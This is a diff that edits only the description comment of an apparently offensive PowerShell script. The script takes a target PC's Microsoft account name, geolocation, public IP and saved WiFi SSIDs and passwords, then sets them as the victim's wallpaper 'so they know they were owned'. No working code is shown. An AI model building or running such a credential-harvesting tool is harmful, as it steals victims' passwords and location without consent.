@@ -21,10 +21,10 @@
 
 .DESCRIPTION 
 	This program gathers details from target PC to include name associated with the microsoft account, their latitude and longitude, 
-	Public IP, and  and the SSID and WiFi password of any current or previously connected to networks.
-	It will take the gathered information and generate a .jpg with that information on show 
-	Finally that .jpg will be applied as their Desktop Wallpaper so they know they were owned
-	Additionally a secret message will be left in the binary of the wallpaper image generated and left on their desktop
+	Public IP, the SSID, and WiFi password of any current or previously connected to networks.
+	It will take the gathered information and generate a .jpg with that information on show.
+	Finally that .jpg will be applied as their Desktop Wallpaper so they know they were owned.
+	Additionally, a secret message will be left in the binary of the wallpaper image generated and left on their desktop.
 #>
 #############################################################################################################################################
 
